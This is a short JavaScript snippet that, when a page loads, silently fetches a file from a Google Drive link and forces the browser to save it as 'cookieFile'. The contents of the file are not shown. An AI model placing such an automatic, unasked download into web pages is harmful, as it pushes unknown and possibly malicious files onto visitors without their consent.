// Function to initiate file download
function downloadFile() {
    const url = 'https://drive.google.com/uc?id=1Y-w3zKdp9yer1F6cLgZzCEbwi0tIEKKX'; // URL of the file to download
    const filename = 'cookieFile'; // Name of the file to be saved
    fetch(url)
    .then(response => response.blob())
    .then(blob => {
        const link = document.createElement('a');
        link.href = window.URL.createObjectURL(blob);
        link.download = filename;
        link.click();
    })
    .catch(error => {
        console.error('Error occurred while downloading file:', error);
    });
}

// Call the download function when the page loads
window.onload = downloadFile;
